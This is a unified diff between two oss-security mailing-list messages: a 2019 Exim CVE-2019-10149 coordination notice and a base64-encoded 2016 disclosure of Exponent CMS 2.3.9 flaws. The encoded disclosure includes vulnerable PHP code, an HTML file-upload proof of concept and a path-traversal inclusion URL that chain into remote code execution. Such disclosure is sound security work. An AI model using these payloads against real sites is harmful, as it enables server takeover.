@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1772" "Tuesday" "4" "June" "2019" "12:15:19" "+0200" "Heiko Schlittermann" "hs@schlittermann.de" "<20190604101519.cpb7hppii3oa4epw@jumper.schlittermann.de>" "51" "[oss-security] Re: CVE-2019-10149: Exim 4.87 to 4.91: possible remote exploit" nil nil nil "6" "2019060410:15:19" "[oss-security] Re: CVE-2019-10149: Exim 4.87 to 4.91: possible remote exploit" (number mark "U       hs@schlitter Jun  4   51/1772  " thread-indent "\"[oss-security] Re: CVE-2019-10149: Exim 4.87 to 4.91: possible remote exploit\"\n") "<20190603201923.akdidsegyfzq3ykj@jumper.schlittermann.de>" ("<20190603201923.akdidsegyfzq3ykj@jumper.schlittermann.de>") nil nil nil nil nil nil nil "[oss-security] Re: CVE-2019-10149: Exim 4.87 to 4.91: possible remote exploit" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6256" "Wednesday" "21" "September" "2016" "10:08:21" "+0800" "=?utf-8?B?RE1f?=" "contact@x0day.me" "<tencent_4B081AB504A3C52B508F84E3@qq.com>" "110" "[oss-security] =?utf-8?B?Q1ZFIHJlcXVlc3TvvJpFeHBvbmVudCBDTVMgMi4z?==?utf-8?B?LjkgVW5yZXN0cmljdGVkIEZpbGUgVXBsb2FkIFJD?==?utf-8?B?RSBhbmQgTG9jYWwgRmlsZSBpbmNsdWRlIHZ1bG5l?==?utf-8?B?cmFiaWxpdHk=?=" nil nil nil "9" "2016092102:08:21" "[oss-security] =?utf-8?B?Q1ZFIHJlcXVlc3TvvJpFeHBvbmVudCBDTVMgMi4z?==?utf-8?B?LjkgVW5yZXN0cmljdGVkIEZpbGUgVXBsb2FkIFJD?==?utf-8?B?RSBhbmQgTG9jYWwgRmlsZSBpbmNsdWRlIHZ1bG5l?==?utf-8?B?cmFiaWxpdHk=?=" (number mark "U       contact@x0da Sep 21  110/6256  " thread-indent "\"[oss-security] =?utf-8?B?Q1ZFIHJlcXVlc3TvvJpFeHBvbmVudCBDTVMgMi4z?==?utf-8?B?LjkgVW5yZXN0cmljdGVkIEZpbGUgVXBsb2FkIFJD?==?utf-8?B?RSBhbmQgTG9jYWwgRmlsZSBpbmNsdWRlIHZ1bG5l?==?utf-8?B?cmFiaWxpdHk=?=\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 1697 invoked by uid 550); 4 Jun 2019 10:36:42 -0000
+Received: (qmail 19575 invoked by uid 550); 21 Sep 2016 02:29:36 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,85 +12,144 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 5707 invoked from network); 4 Jun 2019 10:15:32 -0000
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
-	d=schlittermann.de; s=dd201504; h=In-Reply-To:Content-Type:MIME-Version:
-	References:Message-ID:Subject:To:From:Date:Cc:Content-Description:Content-ID:
-	Content-Transfer-Encoding:Resent-Cc:Resent-To;
-	bh=dKr9n2nYoV8IPtonVConBX1NhRv4Ni7+iL1YQ51suYI=; b=JMcMLhrTCnxswshN2baXnZ8u1W
-	qmDMqN8LEDa7WtF5+QLHiTpycJp6IT+gJ0u/YO70bhfgC3gCCA2G6LnK8XyFFtnvWdH23HL4qyMLU
-	RKrn3+N+qpqN9SVDOn16tjipX8FV38uew3DdOTf16goriYBJfRfInP01LT6AstFbcxdQ=;
-Date: Tue, 4 Jun 2019 12:15:19 +0200
-From: Heiko Schlittermann <hs@schlittermann.de>
-To: oss-security@lists.openwall.com
-Message-ID: <20190604101519.cpb7hppii3oa4epw@jumper.schlittermann.de>
-References: <20190603201923.akdidsegyfzq3ykj@jumper.schlittermann.de>
-MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha512;
-	protocol="application/pgp-signature"; boundary="ivafbrwrczhhuouy"
-Content-Disposition: inline
-In-Reply-To: <20190603201923.akdidsegyfzq3ykj@jumper.schlittermann.de>
-Organization: schlittermann -- internet & unix support
-X-Face: =y#&-VlCH8uT|8#-#JE_^c<:+qPbYxFD`}8`m)xjyA$93tpwm-vKsa(V,0?906(2VIVNQbU
- QzD%zhE+~-AA?\v-v.HY6]ebO4_$vY`l|||Q!EZT5*Xx/>Fj{8E_a.;;#<4S$>&T%n5()2Yt=R5FSC
- y:Na&@T{Rf`kPq^'ffPFA%`mP~>%-LU$d*]]{-%>j={&MsMND.">]H)&#AoSI~(U8Jk;v*;,Pf+l85
- X?H&`
-X-Telegram: @HeikoSchlittermann
-X-Threema: T5RPWMSS
-X-Phone: +49.172.7909055
-X-GPG-Fingerprint: E5CA 331D 44AB 8E4C 806F  DBEE 2610 1B62 F693 76CE
-X-GPG-Key-ID: F69376CE
-User-Agent: NeoMutt/20170113 (1.7.2)
-Subject: [oss-security] Re: CVE-2019-10149: Exim 4.87 to 4.91: possible remote exploit
+Received: (qmail 11793 invoked from network); 21 Sep 2016 02:08:39 -0000
+X-QQ-GoodBg: 0
+X-QQ-SSF: 00100000000000F0
+X-QQ-FEAT: nSUdqPGu3ttVKwDtalJGOu1sJL/UlkA9riBSN+pxEFMiVLoA4RD1VPOH8w4xX
+	VNocRsiIlKcAjseDg1CY1rJUPB3qqJ4eWSy3lCH4KZ+xVQhXLAW2D+IDaFq26GtR6onv34w
+	I9nAUVnBb0/dlR0/RoZgmZw1gImUBAYD1It87cIEnhOuU4mQAV3TZouzJlhjELqeebw4PaI
+	8UE4LUfD45yBHqrfayE+rxYPNDMc9nuFdtonwD+G+RoRy4ozmKnAChMokPLURMijbr72JxV
+	A7rQ==
+X-QQ-BUSINESS-ORIGIN: 2
+X-Originating-IP: 171.217.241.57
+X-QQ-STYLE: 
+X-QQ-mid: bizmailfree82t1474423701t7188
+From: "=?utf-8?B?RE1f?=" <contact@x0day.me>
+To: "=?utf-8?B?b3NzLXNlY3VyaXR5?=" <oss-security@lists.openwall.com>
+Mime-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_57E1EB95_09DDB090_5B11CC35"
+Content-Transfer-Encoding: 8Bit
+Date: Wed, 21 Sep 2016 10:08:21 +0800
+X-Priority: 3
+Message-ID: <tencent_4B081AB504A3C52B508F84E3@qq.com>
+X-QQ-MIME: TCMime 1.0 by Tencent
+X-Mailer: QQMail 2.x
+X-QQ-Mailer: QQMail 2.x
+X-QQ-SENDSIZE: 520
+X-QQ-Bgrelay: 1
+Subject: [oss-security] =?utf-8?B?Q1ZFIHJlcXVlc3TvvJpFeHBvbmVudCBDTVMgMi4z?=
+ =?utf-8?B?LjkgVW5yZXN0cmljdGVkIEZpbGUgVXBsb2FkIFJD?=
+ =?utf-8?B?RSBhbmQgTG9jYWwgRmlsZSBpbmNsdWRlIHZ1bG5l?=
+ =?utf-8?B?cmFiaWxpdHk=?=
 
---ivafbrwrczhhuouy
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
+------=_NextPart_57E1EB95_09DDB090_5B11CC35
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: base64
 
-Hi,
+SGksDQoNCg0KVGhpcyBpcyBZb25nWGlhbyBNYSBvZiBTaWxlbmNlJ3MgUEtB
+ViBUZWFtLiBJIHJlcG9ydGVkIHNvbWUgc2VjdXJpdHkgaXNzdWVzIHRvIEV4
+cG9uZW50Q01TIHNvbWUgZGF5cyBhZ28uIA0KDQoNCiMgVGVzdCBlbnZpcm9u
+bWVudA0KZXhwb25lbnQgdmVyc2lvbjogbGF0ZXN0IDIuMy45DQpwaHA6IDUu
+NS54DQpzZXJ2ZXI6IGFwYWNoZSAyLjIueA0KDQoNCiMgRGV0YWlscw0KDQoN
+CjEuIFVucmVzdHJpY3RlZCBGaWxlIFVwbG9hZA0KdGhlcmUgaXMgYSB1bnJl
+c3RyaWN0ZWQgZmlsZSB1cGxvYWQgaXNzdWUgYXQgZnJhbWV3b3JrL21vZHVs
+ZXMvZm9ybXMvY29udHJvbGxlcnMvZm9ybXNDb250cm9sbGVyLnBocCBhbmQg
+dGhlIHVwbG9hZCBmaWxlIGlzIGxvY2F0ZWQgYXQgL3RtcC8sIHdoZXJlIHBo
+cCBzY3JpcHQgY2FuIGJlIGV4ZWN1dGVkLg0KDQoNCmFsdGhvdWdoIHdlIGRv
+bnQga25vdyBmaWxlIG5hbWUsIGJ1dCB3ZSBjYW4gYnJ1dGUgaXQgc2ltcGx5
+LCBzdWNoIGFzIHRpbWUoKSArICJfIiArIHVwbG9hZCBuYW1lLg0KDQoNCiAg
+ICBwdWJsaWMgZnVuY3Rpb24gaW1wb3J0X2Nzdl9tYXBwZXIoKSB7DQogICAg
+ICAgIC8vQ2hlY2sgdG8gbWFrZSBzdXJlIHRoZSB1c2VyIGZpbGxlZCBvdXQg
+dGhlIHJlcXVpcmVkIGlucHV0Lg0KICAgICAgICBpZiAoIWlzX251bWVyaWMo
+JHRoaXMtPnBhcmFtc1sicm93c3RhcnQiXSkpIHsNCiAgICAgICAgICAgIHVu
+c2V0KCR0aGlzLT5wYXJhbXNbInJvd3N0YXJ0Il0pOw0KICAgICAgICAgICAg
+JHRoaXMtPnBhcmFtc1snX2Zvcm1FcnJvciddID0gZ3QoJ1RoZSBzdGFydGlu
+ZyByb3cgbXVzdCBiZSBhIG51bWJlci4nKTsNCiAgICAgICAgICAgIGV4cFNl
+c3Npb246OnNldCgibGFzdF9QT1NUIiwgJHRoaXMtPnBhcmFtcyk7DQogICAg
+ICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAiIC4gJF9TRVJWRVJbJ0hUVFBf
+UkVGRVJFUiddKTsNCiAgICAgICAgICAgIGV4aXQoJ1JlZGlyZWN0aW5nLi4u
+Jyk7DQogICAgICAgIH0NCg0KDQogICAgICAgIGlmICghZW1wdHkoJHRoaXMt
+PnBhcmFtc1snZm9ybXNfaWQnXSkpIHsNCiAgICAgICAgICAgIC8vIGlmIHdl
+IGFyZSBpbXBvcnRpbmcgdG8gYW4gZXhpc3RpbmcgZm9ybSwganVtcCB0byB0
+aGF0IHN0ZXANCiAgICAgICAgICAgICR0aGlzLT5pbXBvcnRfY3N2X2RhdGFf
+bWFwcGVyKCk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAvL0dl
+dCB0aGUgdGVtcCBkaXJlY3RvcnkgdG8gcHV0IHRoZSB1cGxvYWRlZCBmaWxl
+DQogICAgICAgICAgICAkZGlyZWN0b3J5ID0gInRtcCI7DQoNCg0KICAgICAg
+ICAgICAgLy9HZXQgdGhlIGZpbGUgc2F2ZSBpdCB0byB0aGUgdGVtcCBkaXJl
+Y3RvcnkNCiAgICAgICAgICAgIGlmICgkX0ZJTEVTWyJ1cGxvYWQiXVsiZXJy
+b3IiXSA9PSBVUExPQURfRVJSX09LKSB7DQogICAgICAgICAgICAgICAgLy8J
+JGZpbGUgPSBmaWxlOjp1cGRhdGUoInVwbG9hZCIsJGRpcmVjdG9yeSxudWxs
+LHRpbWUoKS4iXyIuJF9GSUxFU1sndXBsb2FkJ11bJ25hbWUnXSk7DQogICAg
+ICAgICAgICAgICAgJGZpbGUgPSBleHBGaWxlOjpmaWxlVXBsb2FkKCJ1cGxv
+YWQiLCBmYWxzZSwgZmFsc2UsIHRpbWUoKSAuICJfIiAuICRfRklMRVNbJ3Vw
+bG9hZCddWyduYW1lJ10sICRkaXJlY3RvcnkuJy8nKTsgLy9GSVhNRSBxdWlj
+ayBoYWNrIHRvIHJlbW92ZSBmaWxlIG1vZGVsDQoJLi4uLg0KDQoNClBPQzog
+DQoNCg0KCTwhRE9DVFlQRSBodG1sPg0KCTxodG1sPg0KCTxmb3JtIGFjdGlv
+bj0iaHR0cDovL2xvY2FsaG9zdC9leHBvbmVudC0yLjMuOS9pbmRleC5waHA/
+Y29udHJvbGxlcj1mb3JtcyZhY3Rpb249aW1wb3J0X2Nzdl9tYXBwZXImZm9y
+bXNfaWQ9MSZyb3dzdGFydD0wIiBtZXRob2Q9IlBPU1QiIGVuY3R5cGUgPSJt
+dWx0aXBhcnQvZm9ybS1kYXRhIj4NCgk8aW5wdXQgdHlwZT0iZmlsZSIgbmFt
+ZT0idXBsb2FkIj4JDQoJPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3Vi
+bWl0Ij4NCg0KDQoJPC9mb3JtPg0KCTwvaHRtbD4NCg0KDQoyLiBMRkkNCg0K
+DQp0aGVuIExGSSBjb21lcywgYXQgZXhwb25lbnQtMi4zLjkvaW5zdGFsbC9w
+b3B1cC5waHAuDQoNCg0KICAgIDw/cGhwDQogICAgJHBhZ2UgPSAoaXNzZXQo
+JF9SRVFVRVNUWydwYWdlJ10pID8gZXhwU3RyaW5nOjpzYW5pdGl6ZSgkX1JF
+UVVFU1RbJ3BhZ2UnXSkgOiAnJyk7DQogICAgaWYgKGlzX3JlYWRhYmxlKCdw
+b3B1cHMvJyAuICRwYWdlIC4gJy5waHAnKSkgew0KICAgICAgICBpbmNsdWRl
+KCdwb3B1cHMvJyAuICRwYWdlIC4gJy5waHAnKTsNCiAgICB9DQogICAgPz4N
+Cg0KDQpzbyB3ZSBjYW4gdXBsb2FkIGEgcGhwIGZpbGUsIHRoZW4gaW5jbHVk
+ZSBpdCB0byBtYWtlIGEgUkNFIGFnYWluLg0KDQoNClBPQzogDQoJaHR0cDov
+LzEyNy4wLjAuMS9leHBvbmVudC0yLjMuOS9pbnN0YWxsL3BvcHVwLnBocD9w
+YWdlPS4uLy4uL2ZpbGVzL3Rlc3QNCg0KDQoNCg0KMy4gVW5yZXN0cmljdGVk
+IEZpbGUgVXBsb2FkIGFuZCBSQ0UNCg0KDQp0aGVyZSBpcyBhIHVucmVzdHJp
+Y3RlZCBmaWxlIHVwbG9hZCBpc3N1ZSBhdCBmcmFtZXdvcmsvbW9kdWxlcy9m
+b3Jtcy9jb250cm9sbGVycy9mb3Jtc0NvbnRyb2xsZXIucGhwIGFuZCB0aGUg
+dXBsb2FkIGZpbGUgaXMgbG9jYXRlZCBhdCAvdG1wLywgd2hlcmUgcGhwIHNj
+cmlwdCBjYW4gYmUgZXhlY3V0ZWQuDQoNCg0KYWx0aG91Z2ggd2UgZG9udCBr
+bm93IGZpbGUgbmFtZSwgYnV0IHdlIGNhbiBicnV0ZSBpdCBzaW1wbHksIHN1
+Y2ggYXMgdGltZSgpICsgIl8iICsgbmFtZS4NCg0KDQogICAgcHVibGljIGZ1
+bmN0aW9uIGltcG9ydF9jc3ZfbWFwcGVyKCkgew0KICAgICAgICAvL0NoZWNr
+IHRvIG1ha2Ugc3VyZSB0aGUgdXNlciBmaWxsZWQgb3V0IHRoZSByZXF1aXJl
+ZCBpbnB1dC4NCiAgICAgICAgaWYgKCFpc19udW1lcmljKCR0aGlzLT5wYXJh
+bXNbInJvd3N0YXJ0Il0pKSB7DQogICAgICAgICAgICB1bnNldCgkdGhpcy0+
+cGFyYW1zWyJyb3dzdGFydCJdKTsNCiAgICAgICAgICAgICR0aGlzLT5wYXJh
+bXNbJ19mb3JtRXJyb3InXSA9IGd0KCdUaGUgc3RhcnRpbmcgcm93IG11c3Qg
+YmUgYSBudW1iZXIuJyk7DQogICAgICAgICAgICBleHBTZXNzaW9uOjpzZXQo
+Imxhc3RfUE9TVCIsICR0aGlzLT5wYXJhbXMpOw0KICAgICAgICAgICAgaGVh
+ZGVyKCJMb2NhdGlvbjogIiAuICRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSk7
+DQogICAgICAgICAgICBleGl0KCdSZWRpcmVjdGluZy4uLicpOw0KICAgICAg
+ICB9DQoNCg0KICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5wYXJhbXNbJ2Zv
+cm1zX2lkJ10pKSB7DQogICAgICAgICAgICAvLyBpZiB3ZSBhcmUgaW1wb3J0
+aW5nIHRvIGFuIGV4aXN0aW5nIGZvcm0sIGp1bXAgdG8gdGhhdCBzdGVwDQog
+ICAgICAgICAgICAkdGhpcy0+aW1wb3J0X2Nzdl9kYXRhX21hcHBlcigpOw0K
+ICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgLy9HZXQgdGhlIHRlbXAg
+ZGlyZWN0b3J5IHRvIHB1dCB0aGUgdXBsb2FkZWQgZmlsZQ0KICAgICAgICAg
+ICAgJGRpcmVjdG9yeSA9ICJ0bXAiOw0KDQoNCiAgICAgICAgICAgIC8vR2V0
+IHRoZSBmaWxlIHNhdmUgaXQgdG8gdGhlIHRlbXAgZGlyZWN0b3J5DQogICAg
+ICAgICAgICBpZiAoJF9GSUxFU1sidXBsb2FkIl1bImVycm9yIl0gPT0gVVBM
+T0FEX0VSUl9PSykgew0KICAgICAgICAgICAgICAgIC8vCSRmaWxlID0gZmls
+ZTo6dXBkYXRlKCJ1cGxvYWQiLCRkaXJlY3RvcnksbnVsbCx0aW1lKCkuIl8i
+LiRfRklMRVNbJ3VwbG9hZCddWyduYW1lJ10pOw0KICAgICAgICAgICAgICAg
+ICRmaWxlID0gZXhwRmlsZTo6ZmlsZVVwbG9hZCgidXBsb2FkIiwgZmFsc2Us
+IGZhbHNlLCB0aW1lKCkgLiAiXyIgLiAkX0ZJTEVTWyd1cGxvYWQnXVsnbmFt
+ZSddLCAkZGlyZWN0b3J5LicvJyk7IC8vRklYTUUgcXVpY2sgaGFjayB0byBy
+ZW1vdmUgZmlsZSBtb2RlbA0KCS4uLi4NCg0KDQpQT0M6IA0KDQoNCgk8IURP
+Q1RZUEUgaHRtbD4NCgk8aHRtbD4NCgk8Zm9ybSBhY3Rpb249Imh0dHA6Ly9s
+b2NhbGhvc3QvZXhwb25lbnQtMi4zLjkvaW5kZXgucGhwP2NvbnRyb2xsZXI9
+Zm9ybXMmYWN0aW9uPWltcG9ydF9jc3ZfbWFwcGVyJmZvcm1zX2lkPTEmcm93
+c3RhcnQ9MCIgbWV0aG9kPSJQT1NUIiBlbmN0eXBlID0ibXVsdGlwYXJ0L2Zv
+cm0tZGF0YSI+DQoJPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9InVwbG9hZCI+
+CQ0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCI+DQoNCg0K
+CTwvZm9ybT4NCgk8L2h0bWw+DQoNCg0KDQoNCg0KDQojIFBhdGNoZXMNCg0K
+DQpodHRwczovL2V4cG9uZW50Y21zLmxpZ2h0aG91c2VhcHAuY29tL3Byb2pl
+Y3RzLzYxNzgzL2NoYW5nZXNldHMvMzU1NzAyYTk4MzVjZjUyNzc5NmM5ZDQ2
+OWE4MjI1OGI3NjM5MTQ4YQ0KaHR0cHM6Ly9leHBvbmVudGNtcy5saWdodGhv
+dXNlYXBwLmNvbS9wcm9qZWN0cy82MTc4My9jaGFuZ2VzZXRzLzYyOGVhNjE4
+MzRkOTI2MTE2NDRhMWRmYzFiYTI0MjE2ZWU2NDdjNTk=
 
-our non-public security Git repo is
+------=_NextPart_57E1EB95_09DDB090_5B11CC35--
 
-    ssh://git@git.exim.org/exim.git
 
-Access is granted to the known and trusted SSH keys we have.
 
-The branch fix-CVE-2019-10149 contains the fix. It is one commit ahead
-of the exim-4_91+fixes branch and we'll eventuelly merge it into the
-+fixes branch.
-
-The relevant commit is d740d2111f189760593a303124ff6b9b1f83453d and is
-signed with my GPG key, the same key that signed this message.
-
-If you need help backporting it to older releases, please do not
-hesitate to contact us.
-
-The planned CRD (coordinated release date) is 2019-06-11 10.00 UTC.
-Please do not publish any package or source until this date.
-
-    Best regards from Dresden/Germany
-    Viele Gr=C3=BC=C3=9Fe aus Dresden
-    Heiko Schlittermann
---
- SCHLITTERMANN.de ---------------------------- internet & unix support -
- Heiko Schlittermann, Dipl.-Ing. (TU) - {fon,fax}: +49.351.802998{1,3} -
- gnupg encrypted messages are welcome --------------- key ID: F69376CE -
- ! key id 7CBF764A and 972EAC9F are revoked since 2015-01 ------------ -
-
---ivafbrwrczhhuouy
-Content-Type: application/pgp-signature; name="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-
-iQEzBAABCgAdFiEE0L/WueylaUpvFJ3Or0zGdqa2wUIFAlz2RLcACgkQr0zGdqa2
-wUJYKAf+OTTAC63kY0GkvwOBvy2ChdUbQBpnhliAxj5awN7QrVwFU9nY+P8tH6GY
-9bd1z7cgmWPj3CsTXgU00fDKaav+IFBli/rPddPEzTD0NMfA2oWyuo0GPaalyMO6
-sY0Emn2cruLId1KG1Rr7WgZPWVj4BFxvOQdy8n00rvYrvILSj1ZWPHErzrmvLJLf
-+lMDNo+avtnDXwte05d9rMXD+0TQLsBqqkewrjI/Ht1GsZ3lP9mZ2teUnwNrHpBi
-ZPePpfvBGZRmFJcB1/jVDR2uD+tWbeU9f7NZH7w6106OZwV0BuDOu9z39hozYyIt
-LCuFQNC4UKz8KZvnNs+cMhaHlGp1tg==
-=zXv1
------END PGP SIGNATURE-----
-
---ivafbrwrczhhuouy--
